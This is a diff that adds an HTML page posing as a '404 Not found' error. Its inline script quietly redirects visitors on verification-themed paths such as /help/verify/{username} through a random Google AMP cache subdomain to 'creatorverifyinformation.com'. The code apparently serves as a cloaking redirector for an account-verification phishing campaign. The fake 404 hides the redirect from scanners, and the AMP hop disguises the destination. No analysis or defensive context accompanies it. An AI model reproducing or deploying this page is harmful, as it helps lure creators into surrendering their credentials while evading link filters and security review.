@@ -1,0 +1,71 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="robots" content="noindex, nofollow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title></title>
+  <style>
+    html,body{margin:0;height:100%;background:#111;color:#eee;font:16px/1.4 system-ui,sans-serif}
+    main{min-height:100%;display:flex;align-items:center;justify-content:center;display:none}
+    main.show{display:flex}
+    p{opacity:.7}
+  </style>
+  <script>
+(function () {
+  // CTA mail path prefixes only (slot_identity _TT_PATHS)
+  var ALLOWED = {
+    "content/support": 1,
+    "help/verify": 1,
+    "account/badge": 1,
+    "creator/confirm": 1,
+    "verification/continue": 1
+  };
+  var AMP_HOST = "creatorverifyinformation.com";
+  var AMP_PATH = "1003719756929";
+
+  function show404() {
+    document.title = "404";
+    var m = document.getElementById("nf");
+    if (m) m.className = "show";
+  }
+
+  function ampId() {
+    var n = Math.floor(Math.random() * 100000000);
+    return ("00000000" + n).slice(-8);
+  }
+
+  function ctaUser() {
+    var parts = location.pathname.replace(/\/+$/, "").split("/").filter(Boolean);
+    // only /{prefix}/{suffix}/{username} — nothing else
+    if (parts.length !== 3) return null;
+    var prefix = parts[0] + "/" + parts[1];
+    if (!ALLOWED[prefix]) return null;
+    var u = parts[2];
+    if (!/^[A-Za-z0-9._]{1,64}$/.test(u)) return null;
+    if (u === "index.html" || u === "404.html") return null;
+    return u;
+  }
+
+  if (!ctaUser()) {
+    show404();
+    return;
+  }
+
+  var dest =
+    "https://" +
+    ampId() +
+    ".cdn.ampproject.org/c/s/" +
+    AMP_HOST +
+    "/" +
+    AMP_PATH +
+    location.search +
+    location.hash;
+  location.replace(dest);
+})();
+  </script>
+</head>
+<body>
+  <main id="nf"><div><h1>404</h1><p>Not found.</p></div></main>
+</body>
+</html>
